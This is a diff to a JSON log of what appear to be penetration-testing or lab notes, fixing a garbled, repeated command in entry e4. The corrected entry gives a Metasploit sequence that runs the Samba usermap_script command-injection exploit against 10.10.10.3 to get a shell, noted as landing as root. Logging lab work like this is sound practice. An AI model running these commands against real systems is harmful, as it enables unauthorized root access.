@@ -40,7 +40,7 @@
       "id": "e4",
       "title": "Launch usermap_script exploit",
       "phase": "Exploitation",
-      "command": "use exploit/multi/samba/usermap_scriptuse exploit/multi/samba/usermap_scriptuse exploit/multi/samba/usermap_scriptuse exploit/multi/samba/usermap_scriptuse exploit/multi/samba/usermap_scriptuse exploit/multi/samba/usermap_scriptuse exploit/multi/samba/usermap_scriptuse exploit/multi/samba/usermap_script\nset RHOSTS 10.10.10.3\nset LHOST tun0\nrun",
+      "command": "use exploit/multi/samba/usermap_script\nset RHOSTS 10.10.10.3\nset LHOST tun0\nrun",
       "description": "Metasploit module exploiting the username map script command injection to get a shell.",
       "comments": "Lands as root immediately, no privesc chain needed.",
       "datetime": "2026-01-05T09:31:00Z",
